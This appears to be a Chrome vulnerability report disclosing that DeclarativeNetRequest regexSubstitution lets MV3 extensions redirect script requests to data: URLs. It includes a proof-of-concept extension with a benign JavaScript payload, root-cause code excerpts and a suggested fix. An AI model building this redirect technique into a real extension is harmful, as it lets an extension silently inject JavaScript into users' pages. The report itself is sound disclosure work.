# VRP Report: DNR regexSubstitution Allows Subresource Redirect to data: URLs

## Title

DeclarativeNetRequest regexSubstitution allows MV3 extensions to redirect subresource requests to data: URLs, bypassing all redirect safety checks

## Severity

Medium-High (Security feature bypass in MV3 extension security model)

## Component

Extensions > DeclarativeNetRequest

## Chrome Version

Tested against Chromium source at HEAD (April 2026). Affects all current Chrome versions with MV3 DNR support.

## Summary

Chrome's DeclarativeNetRequest (DNR) API allows MV3 extensions to use `regexSubstitution` to redirect subresource requests (e.g., `<script>` tags) to `data:` URLs. This bypasses all redirect safety checks because:

1. `regexSubstitution` performs NO scheme validation at parse time (unlike `redirect.transform` which validates schemes)
2. Extension-originated redirects set `bypass_redirect_checks = true`, skipping `IsSafeRedirectTarget`
3. `BlockedSchemeNavigationThrottle` only applies to main frame navigations, not subresources
4. The net-layer `IsSafeRedirect` check is also bypassed

This means a `<script>` subresource can be silently redirected to a `data:text/javascript,...` URL, and the JavaScript executes in the context of the loading page's origin.

## Steps to Reproduce

### 1. Create MV3 Extension

**manifest.json:**
```json
{
  "manifest_version": 3,
  "name": "DNR regexSubstitution Scheme Bypass PoC",
  "version": "1.0",
  "permissions": ["declarativeNetRequest", "declarativeNetRequestFeedback"],
  "host_permissions": ["*://testserver.example/*"],
  "declarative_net_request": {
    "rule_resources": [{"id": "ruleset_1", "enabled": true, "path": "rules.json"}]
  },
  "background": {"service_worker": "background.js"}
}
```

**rules.json:**
```json
[{
  "id": 1,
  "priority": 1,
  "action": {
    "type": "redirect",
    "redirect": {
      "regexSubstitution": "data:text/javascript,document.title='REDIRECTED_TO_DATA_URL';console.log('DNR_REDIRECT_SUCCESS')"
    }
  },
  "condition": {
    "regexFilter": "^https://testserver\\.example/redirect-target\\.js$",
    "resourceTypes": ["script"]
  }
}]
```

**background.js:**
```javascript
chrome.declarativeNetRequest.onRuleMatchedDebug.addListener((info) => {
  console.log('[DNR] Rule matched:', JSON.stringify(info));
});
```

### 2. Set Up Test Environment

Add to `/etc/hosts`:
```
127.0.0.1 testserver.example
```

### 3. Load Extension and Test

1. Go to `chrome://extensions` → Enable Developer Mode → Load Unpacked → select extension directory
2. Navigate to any page that includes: `<script src="https://testserver.example/redirect-target.js"></script>`
3. Open DevTools Console

### Expected Result (if vulnerable)

- The script request to `testserver.example/redirect-target.js` is redirected to the data: URL
- `DNR_REDIRECT_SUCCESS` appears in the console
- `document.title` changes to `REDIRECTED_TO_DATA_URL`
- The injected JavaScript runs with the page's origin

### Expected Result (if mitigated)

- The redirect is blocked (ERR_BLOCKED_BY_CLIENT or ERR_UNSAFE_REDIRECT)
- Or the data: URL script is blocked by same-origin policy
- Or the DNR rule fails to load with a parsing error

## Root Cause Analysis

### 1. Missing scheme validation in regexSubstitution (indexed_rule.cc:406-412)

```cpp
// redirect.transform validates scheme (line 401-403):
if (auto error = ValidateTransform(*redirect->transform, ...) { ... }

// redirect.regexSubstitution does NOT validate scheme (line 406-412):
if (!redirect->regex_substitution.has_value())
  return ParseResult::ERROR_INVALID_REDIRECT;
if (redirect->regex_substitution->empty())
  return ParseResult::ERROR_INVALID_REDIRECT;
// No scheme validation whatsoever
```

### 2. Extension redirects bypass safety checks (web_request_proxying_url_loader_factory.cc:465-476)

```cpp
bool redirect_url_comes_from_extension =
    redirect_url_ == redirect_info.new_url;
if (redirect_url_comes_from_extension) {
  head->bypass_redirect_checks = true;  // ALL safety checks skipped
}

if (!redirect_url_comes_from_extension &&
    !IsRedirectSafe(request_.url, redirect_info.new_url,
                    info_->is_navigation_request)) {
  OnNetworkError(...);  // Only non-extension redirects are checked
  return;
}
```

### 3. No subresource redirect throttle

`BlockedSchemeNavigationThrottle` (blocked_scheme_navigation_throttle.cc:105-113) only applies to main frame navigations. Subresource loads to data: URLs have no equivalent check.

### 4. DCHECK-only sanity check (ruleset_matcher_base.cc:377-381)

```cpp
// Sanity check that we don't redirect to a javascript url.
DCHECK(!redirect_url.SchemeIs(url::kJavaScriptScheme));
```

Only checks javascript: scheme, only in debug builds. No check for data:, chrome:, or other schemes.

## Security Impact

### MV3 Security Model Bypass

MV3 was designed to restrict extension redirect capabilities by removing `webRequestBlocking`. DNR was positioned as the "safe" alternative. However:

- `webRequest.redirectUrl` (MV2): Allows data: redirects but requires `webRequestBlocking` (being deprecated)
- `redirect.transform` (MV3 DNR): Validates scheme, only allows http/https/ftp/chrome-extension
- `regexSubstitution` (MV3 DNR): **No scheme validation**, allows data: redirects

This creates an unintended capability gap where MV3 `regexSubstitution` is LESS restrictive than the MV3 `redirect.transform` it was designed alongside.

### Practical Impact

A malicious or compromised MV3 extension could:
1. Silently redirect script subresources to data: URLs
2. Inject arbitrary JavaScript into any page covered by host_permissions
3. The injection is harder to detect than content scripts (no separate script injection, just a redirect rule)
4. DNR rules are declarative and don't require background script execution

## Suggested Fix

Add scheme validation to `regexSubstitution` redirect resolution in `regex_rules_matcher.cc`, similar to what `redirect.transform` does:

```cpp
// After resolving the regex substitution URL:
if (redirect_url.SchemeIs(url::kJavaScriptScheme) ||
    redirect_url.SchemeIs(url::kDataScheme) ||
    redirect_url.SchemeIs(content::kChromeUIScheme) ||
    redirect_url.SchemeIs(content::kChromeUIUntrustedScheme) ||
    redirect_url.SchemeIs(content::kChromeDevToolsScheme)) {
  return std::nullopt;
}
```

Or apply the same allowlist approach used by `ValidateTransform` (http, https, ftp, chrome-extension only).

## Related Bugs

- crbug.com/40111509 (referenced in regex_rules_matcher.cc:392 TODO)
- The `bypass_redirect_checks` for extension redirects is a separate design decision that amplifies this issue

## PoC Extension

Full PoC extension is available at: `poc/extension_dnr_redirect/`
